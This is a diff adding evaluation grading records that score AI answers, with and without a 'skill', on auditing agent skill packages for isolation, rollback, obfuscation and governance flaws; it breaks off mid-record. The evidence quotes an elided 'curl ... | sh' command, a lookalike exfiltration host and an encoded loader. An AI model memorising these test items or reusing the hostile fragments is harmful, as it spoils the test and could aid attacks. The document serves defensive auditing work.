+      {
+        "eval_slug": "AST06-case-3",
+        "assertion_index": 4,
+        "text": "The output names the specific evidence that would close it: this deployment runs sandboxed by default with host mode behind a documented explicit opt-in.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Evidence that this deployment runs in container isolation by default … and host escape requires explicit override."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The fact that the container sandbox is available and can be enabled with a single config line demonstrates mitigation capability."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-control-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to file this as an AST06 finding and names AST10 Manifest Stripping as the scenario the check's registry ids point at.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response declines to file as AST06 and says: \"It is formally assigned to **AST10-S04 (Manifest Stripping)**, not any AST06 scenario.\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response affirms the AST06 finding and never mentions AST10 Manifest Stripping."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-control-case-1",
+        "assertion_index": 1,
+        "text": "The response states that the check is an artifact-signal-only proxy there — a package with a stripped permission block is indistinguishable from one that never declared any — rather than coverage of a scenario.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response notes the check \"covers: artifact-signal-only\" and links it to AST10‑S04, indicating it is an artifact‑signal‑only proxy rather than a scenario coverage."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains no statement about the check being an artifact‑signal‑only proxy or indistinguishability."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response contradicts the co-reviewer and reports a finding from the manifest alone — a declared write scope of filesystem root with an empty deny_write — stating that a bundled script or persistence call site is not required because the defining condition is a disjunction.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, your co-reviewer is not correct... The second disjunct is purely declarative: a write scope that reaches filesystem root ... No executable code is required."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response says co-reviewer is technically correct, not contradictory, and does not mention disjunction or empty deny_write."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response states that narrowing the declared write list is not on its own evidence that any boundary enforces the manifest at run time, so the manifest edit does not close the isolation question.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Fixing the manifest does not close the AST06 finding ... The manifest only matters if there’s an actual runtime boundary enforcing it."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response claims tightening the manifest removes a permissive foothold, not that it fails to provide evidence of enforcement."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-1",
+        "assertion_index": 0,
+        "text": "The response reports the AST07 status as declared-and-uncovered (or an equivalent 'not decidable from this package' status) and does not report the category as pass, clean, no findings, or an equivalent all-clear.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "declared-and-uncovered: predecessor record and resolver decision record for update validation unavailable; ..."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Verdict: CLEAN — ..."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-2",
+        "assertion_index": 0,
+        "text": "The response declines to conclude that a rollback attack occurred, and states that a decreased resolved version is on its own insufficient because it convicts legitimate operator-initiated rollbacks too.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "This is not a determination that can be made from the artifact alone... without intent record you cannot convict legitimate rollbacks."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says \"No, this does not appear to be a rollback attack\" but never states that a decreased resolved version alone is insufficient or that it would convict legitimate operator‑initiated rollbacks."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-2",
+        "assertion_index": 1,
+        "text": "The response asks for a resolver decision record (the requested constraint, the candidate versions offered, and the version resolved) and separately for an operator-intent record, naming both rather than only one.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Decision rule 2 requires: the requested version constraint, the candidate set offered, the resolved version, and an operator‑intent record."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never asks for a resolver decision record or an operator‑intent record; it provides no such request."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-2",
+        "assertion_index": 4,
+        "text": "The response leaves Rollback Attack explicitly undecided rather than reporting it as either confirmed or cleared.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You must not convict... Verdict: declared‑and‑uncovered. The attack is left undecided."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response concludes \"No, this does not appear to be a rollback attack\" – it clears the issue rather than leaving it undecided."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-3",
+        "assertion_index": 0,
+        "text": "The response attributes the described drift to AST05 (drift in externally referenced content) rather than to AST07, and says so explicitly rather than merely mentioning AST05 in passing.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "a payload ... belongs to **AST05 (Untrusted External Instructions)** ... This finding belongs **entirely** to AST05."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions AST05 or attributes drift to it."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-3",
+        "assertion_index": 1,
+        "text": "The response rejects tightening or hardening the version pin as the remediation, and gives as the reason that the package's own pin held byte-for-byte so a stronger pin closes nothing.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "**Do not pin harder here — that is misdirection.** The skill’s own version pin did not drift; it held, so a stronger pin closes nothing."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response recommends pinning the remote runbook, not rejecting a tighter pin."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-3",
+        "assertion_index": 3,
+        "text": "The response does not report a detected, confirmed, or convicted AST07 finding for this package, and reports AST07 as declared-and-uncovered.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The verdict for AST07 on this artifact is `declared-and-uncovered` and no AST07 finding is reported."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention AST07 at all, nor report it as declared-and-uncovered."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-control-case-1",
+        "assertion_index": 0,
+        "text": "The response refuses to mark AST07 not-applicable and says the blind auto-apply is AST07's own half of the same incident, separately fixable and separately owned.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You **cannot** mark the AST07 row as *not‑applicable* … AST07 is not superseded by AST02 — they represent distinct, separable failures."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Yes, you can mark the AST07 row as not‑applicable in your incident report..."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-control-case-1",
+        "assertion_index": 3,
+        "text": "The response rejects gating every update on manual approval as the control, and gives the alternative as a semantic security check that routes only substantive changes to a human reviewer.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It rejects mandatory manual approval for every update and recommends semantic diff analysis and routing only substantive changes to human review."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not reject manual‑approval gating nor propose a semantic security check routing only substantive changes to a human."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to confirm Hot-Reload Abuse from the before-and-after content hashes, and states that the hash pair establishes only that the bytes changed.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Do not file this as Hot-Reload Abuse under AST07, do not mark it confirmed... you cannot claim Hot-Reload Abuse without all three required evidences. A content‑hash change... is not sufficient."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says \"Filing under AST07 (Hot-Reload Abuse) is appropriate. Marking it confirmed...\" indicating it confirms rather than declines the abuse."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response names the further evidence the claim requires and says what each item establishes that the hash pair does not — a host reload event for that path, showing the change took effect without a restart, and the identity that wrote the file, attributing it.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "you must also prove: 1. A host reload event that correlates with the file change, and 2. Directory ownership showing the change came from an untrusted source."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not name additional evidence such as a host reload event or file writer identity; it only mentions the uptime dashboard."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response leaves the scenario explicitly undecided rather than reporting it confirmed or cleared, and states that the write-up must name which evidence could not be obtained instead of converting the gap into either a confirmation or a clean result.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "File the incident as inconclusive for AST07, and record AST07 as declared-and-uncovered, explicitly listing that step 4 (hot‑reload telemetry and ownership) could not be obtained."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response states \"Marking it confirmed... Proceed with closing the incident,\" so it does not leave the scenario undecided."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-1",
+        "assertion_index": 0,
+        "text": "The response concludes that neither the .docx nor the symlink is a finding and gives a measured reason for each — the archive's compression ratio being within an ordinary range, and the symlink's target resolving to a path inside the package — rather than clearing them because the package looks unremarkable.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The .docx ... no signs of compression ratio abuse ... does not constitute a decompression bomb. The symlink is present but stays within the package boundary, posing no path traversal risk."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response gives reason for the symlink staying within bounds but never mentions the archive's compression ratio, only that the .docx is small."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-1",
+        "assertion_index": 1,
+        "text": "The response reports the verdict against an explicitly stated scope (PASS, or PASS/INCOMPLETE with the incompleteness named) rather than as an unqualified 'clean' or 'no findings'.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Verdict: **PASS — expected clean result, scanner sensitivity should be tuned.**"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response calls the fixture 'clean' and says you can wave it through, but does not state a PASS or any explicit scope."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-2",
+        "assertion_index": 2,
+        "text": "The response states that C5's in-the-clear shell command is not an AST08-S02 finding because nothing was hidden, and routes it to the category that owns the payload itself (AST01).",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "C5 contains a visible `curl ... | sh` command in the raw bytes, not obfuscated — so it belongs to AST01, not AST08"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It says the shell command is irrelevant to AST08‑S02, but does not route it to AST01."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-3",
+        "assertion_index": 0,
+        "text": "The write-up records two separate findings — the payload under its own category (AST01 execution/exfiltration) and the scanner miss under AST08 — and does not merge them into a single finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You must **file two separate findings**: 1. AST01‑S01 ... 2. AST08‑S04 ... **Do not merge** these."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention two separate findings, AST01 category, or AST08 miss; only calls it a false negative."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-3",
+        "assertion_index": 2,
+        "text": "The write-up names at least one predicate deliberately excluded from the guard class (platform.system, sys.platform, or os.name) and states the consequence that a logic bomb keyed on it remains uncovered after the rule is fixed.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It states **AST08‑S04’s check deliberately excludes `platform.system()`** and that a logic bomb keyed on it will still be missed."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response never names platform.system, sys.platform, or os.name as excluded predicates."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-3",
+        "assertion_index": 3,
+        "text": "The write-up rejects 'zero findings' or 'clean' as a reportable scanner verdict and substitutes a PASS/FAIL/INCOMPLETE classification against a stated scope.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The answer calls a clean scan a **FAIL/INCOMPLETE** result and recommends reporting as PASS/FAIL/INCOMPLETE rather than ‘zero findings’."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not reject 'zero findings' nor provide a PASS/FAIL/INCOMPLETE classification against a scope."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-control-case-1",
+        "assertion_index": 0,
+        "text": "The response refuses the clean write-up and states that neither finding was suppressible, because a reputation allowlist may suppress a finding about where content is fetched from and never one about where data is sent.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, the write-up is not acceptable... reputation-based allowlists may *only* suppress findings about *where content is fetched from* — never about *where data is sent*."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not state that neither finding was suppressible nor that allowlists only suppress fetches; it only calls the write‑up misleading."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-control-case-1",
+        "assertion_index": 2,
+        "text": "The response identifies both destinations as defeating a naive matcher and states the required rule — matching on the host component, exact or suffix at a label boundary, rather than substring or prefix matching on unparsed URL text.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "`api.github.com.evil.example` exploits a subdomain-suffix match... Host matching must be exact-or-suffix-at-a-label-boundary; both cases fail that."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention the naive matcher nor prescribe exact or suffix‑at‑label‑boundary host matching."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response refuses 'source reviewed, no findings' as a reportable verdict and classifies the result against an explicitly stated scope instead — PASS, FAIL or INCOMPLETE — naming what was not examined.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"Do not proceed with 'source reviewed, no findings.'\" and \"Correct verdict: FAIL\" plus naming the unexamined .pyc files."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response refuses the verdict but does not use PASS/FAIL/INCOMPLETE labels; it says \"Correct verdict: This is a confirmed bytecode cache poisoning risk\" without the required classification."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response gives the remediation as hashing and scanning the exact artifact loaded at run time and invalidating untrusted caches, rather than as a more careful review of the shipped source.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"The defense is to 'scan and hash the exact artifact loaded at runtime, invalidate untrusted caches.'\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not provide remediation of hashing/scanning the runtime artifact or invalidating untrusted caches; it only warns against waving through."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to record AST09 as a pass, clean, or green for this package.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Do not tick AST09 as a pass, and do not write \"inconclusive.\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "You can safely tick AST09 as a pass and close the ticket."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-1",
+        "assertion_index": 1,
+        "text": "The response declines the 'inconclusive' wording on the ground that nothing was checked — no AST09 question was put to the package at all — rather than on the ground that the scan result was conclusive.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Per the NEVER rules: never write \"clean\" or \"inconclusive\" for AST09."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Therefore, this is not inconclusive — it’s a true negative."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-1",
+        "assertion_index": 2,
+        "text": "The response states that no scan of a single package can decide AST09, and gives the reason that approval, inventory and offboarding state are held by the organisation rather than inside the artifact.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "A scanner result ... does not and cannot evidence compliance with AST09 ... findings depend on external governance systems, not package internals."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The scanner correctly returned clean, and the package is explicitly designed as a clean fixture."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-1",
+        "assertion_index": 3,
+        "text": "The response names at least three specific organisational records or checks that would decide it, such as an inventory row keyed on the content hash, the installer's identity and offboarding state, the credential the skill runs under, an execution record over a real interval, or the discovery method used.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "whether the skill is inventoried, approved, linked to an installer identity, subject to offboarding revocation ... and whether its execution produces bilateral, signed admission and outcome receipts"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no mention of inventory rows, installer identity, off‑boarding state, execution records or discovery method."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-1",
+        "assertion_index": 4,
+        "text": "The response frames the outcome as a named missing system or process that should be written down as the finding, rather than as a status value, and does not advise closing the ticket on the scanner result.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Closing the ticket based on a scanner result ... Compliance cannot accept this. You must ... not declare it closed."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It advises marking AST09 as passed and closing the ticket rather than naming a missing system."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-2",
+        "assertion_index": 0,
+        "text": "The response identifies operator control over the record as the specific defect and names the correction-row insertion available to the platform team as the mechanism that establishes it, rather than pointing at retention, backups, or field coverage.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "What you have is an operator-controlled, *editable* log — even with an append-only trigger and correction mechanism, the platform team retains the ability to modify the *semantic truth* of the record (via correction rows)"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never calls out operator‑control of the log as the defect; it discusses immutability, access controls, etc., and even mentions retention and backups."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-2",
+        "assertion_index": 1,
+        "text": "The response requires two separate records per execution attempt: one produced before execution recording what was authorised, and one produced after recording what actually happened.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Admission receipt: Signed proof, generated *before* execution... Outcome receipt: A separate, signed record of what actually happened"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "No requirement for two separate records (pre‑execution and post‑execution) appears in the response."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-2",
+        "assertion_index": 2,
+        "text": "The response requires a shared identifier joining those two records and says what an auditor can only establish because of it.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Without these two receipts, joined by `attempt_id`, an auditor cannot verify that what was allowed is what actually occurred"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The answer does not mention a shared identifier linking two records or what an auditor could infer from it."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-2",
+        "assertion_index": 3,
+        "text": "The response requires the policy version in effect to be captured inside the signed record at decision time rather than reconstructed after the fact.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No binding of `policy_version` at decision time... AST09 rule 3 requires this to be recorded *in the signed admission receipt*, not reconstructed from a separate policy history"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never talks about capturing policy_version in a signed record at decision time."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-2",
+        "assertion_index": 4,
+        "text": "The response warns that a missing outcome record is not evidence the action was blocked, and names at least one benign cause that produces an identical pattern.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "a missing outcome receipt cannot be trusted as evidence of a block — it could just be missing telemetry (or a crashed worker, a full queue, or deletion)"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "There is no warning about a missing outcome record or any benign cause producing the same pattern."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-3",
+        "assertion_index": 0,
+        "text": "The response rejects the 100% or fleet-wide wording and restates the claim scoped to the population the scanning method can actually reach.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, the claim is not supportable... Endpoint and registry scanning show no unmatched skills within the population these tools can observe."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not reject the 100% claim; it affirms it as supportable and does not restate the claim scoped to the reachable population."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-3",
+        "assertion_index": 1,
+        "text": "The response identifies skills running inside managed SaaS copilots or agent platforms as the population the scan is blind to, and attributes that blindness to architecture rather than to concealment by an attacker.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Skills deployed inside managed SaaS copilots or agent platforms ... are invisible to EDR ... not due to evasion, but due to architectural isolation."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions skills inside managed SaaS copilots or agent platforms, nor attributes any blindness to architecture."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-3",
+        "assertion_index": 2,
+        "text": "The response requires the discovery method to be stated inside the reported claim or finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The coverage claim must name the discovery method used, per decision rule 4."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not require the discovery method to be stated inside the claim; it merely assumes the EDR scan was performed."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-3",
+        "assertion_index": 3,
+        "text": "The response names a different, identity- or posture-based discovery method for the unreachable population and lists at least two concrete telemetry sources it would draw on.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "identity- and posture-based discovery methods... telemetry from identity providers (e.g., OAuth app inventories, grant logs)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "No alternative identity- or posture‑based discovery method is named, and no telemetry sources are listed."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-case-3",
+        "assertion_index": 4,
+        "text": "The response treats an observed permission, scope, or consent change as an event that should trigger inventory and revocation immediately, rather than as routine telemetry to review later.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "scope drift (e.g., new OAuth consents) triggers discovery workflows (decision rule 5)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response makes no mention of treating permission, scope, or consent changes as immediate inventory/revocation events."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-control-case-1",
+        "assertion_index": 0,
+        "text": "The response says the finding is not safe to file as written and identifies the cause as two different hashed surfaces producing two different join keys.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Yes, it matters — and no, the finding is not safe to file as written... these two methods produce different content hashes... two different hashed surfaces producing two different join keys."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response says finding not safe to file but never mentions join keys; it only cites different file sets as cause."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-control-case-1",
+        "assertion_index": 1,
+        "text": "The response states that an empty join under mismatched keys is a join failure rather than evidence that an approval never happened.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The empty join result here does not distinguish between ... Skills that were never approved ... and Skills that are approved but hashed under a different glob set, indicating the empty join is a failure, not evidence of missing approval."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains no statement about an empty join being a join failure versus evidence of missing approval."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-control-case-1",
+        "assertion_index": 2,
+        "text": "The response requires the inventory row to record which surface produced the hash, and the join to be recomputed over one agreed surface before any count is reported.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Per AST09 rule ... keying an inventory row on the package hash without recording which surface produced it creates false positives. ... Document the hashing surface used ... Only after alignment can “no match” be treated as evidence of absence."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response never requires inventory rows to record which surface produced the hash nor specifies recomputing the join over one agreed surface before reporting."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response names the origin as the absent revocation step in the offboarding workflow rather than as an over-broad grant, and states that this is a routine, high-frequency offboarding gap rather than something an incident-response playbook would trigger on.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The issue is a failure of governance process, specifically the offboarding workflow... Revocation tied only to explicit incident response misses the routine case. Orphaned Skill is not an incident — it is an unremarkable, high-frequency offboarding gap."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions an absent revocation step, a routine high‑frequency off‑boarding gap, or an incident‑response playbook."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response rejects reducing the credential's scope as the remediation, and gives the reason that it leaves the offboarding path untouched so the same condition recurs at the next departure.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "you could reduce its scope to read-only, but the skill would still be running... Reporting this as AST03 and assigning a narrow scope fix ... allows the same situation to recur with the next departure."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not reject reducing the credential's scope nor give the reason that it leaves the off‑boarding path untouched and recurs."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-2",
+        "assertion_index": 0,
+        "text": "The response identifies scripts/loader.py's ARCHIVE literal as the finding and states that reading it requires two decode layers (base64 then gzip), not one.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response mentions \"scripts/loader.py\": \"An encoded literal (ARCHIVE) using base64 encoding\" and \"The decoded content is piped immediately through gzip.decompress\" indicating base64 then gzip, i.e., two decode layers."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response mentions a two‑layer payload in `scripts/loader.py` but never refers to the ARCHIVE literal."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-2",
+        "assertion_index": 1,
+        "text": "The response states that most of AST10's six scenarios cannot be decided from this package alone, and names at least two distinct kinds of external evidence that would be required, such as a pre-port manifest, the target platform's default permissions, or cross-registry install and scan data.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It states \"your audit cannot close five of the six AST10 scenarios\" and lists required external evidence such as \"pre‑port manifest\" (AST10‑S04) and \"target platform’s default permissions\" (AST10‑S05) and cross‑registry data (AST10‑S02)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It only says two scenarios (S01, S04) are not closed and provides no claim that most of the six scenarios are undecidable nor any external evidence types."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-3",
+        "assertion_index": 0,
+        "text": "The response explains the disagreement in terms of how the two entries are matched — basename versus exact path form — rather than only asserting that the manifest is wrong.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
